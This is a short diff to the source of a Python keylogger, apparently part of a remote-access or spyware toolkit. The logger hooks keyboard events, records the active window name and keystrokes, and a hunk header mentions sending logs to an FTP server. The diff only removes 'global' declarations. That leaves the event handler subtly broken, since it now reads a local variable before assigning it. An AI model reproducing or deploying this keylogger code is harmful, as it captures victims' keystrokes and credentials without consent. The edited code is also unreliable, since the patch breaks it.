@@ -42,8 +42,6 @@ or an FTP server
 
 # main
 def _event(event):
-    global logs
-    global window
     try:
         if event.WindowName != window:
             window = event.WindowName
@@ -64,7 +62,6 @@ def _event(event):
     return True
 
 def _run_windows():
-    global abort
     while True:
         hm = hook_manager.HookManager()
         hm.KeyDown = _event
@@ -74,7 +71,6 @@ def _run_windows():
             break
 
 def _run():
-    global abort
     while True:
         hm = hook_manager.HookManager()
         hm.KeyDown = _event
@@ -88,7 +84,6 @@ def run():
     Run the keylogger
 
     """
-    global threads
     try:
         if 'keylogger' not in threads or not threads['keylogger'].is_alive():
             if os.name == 'nt':
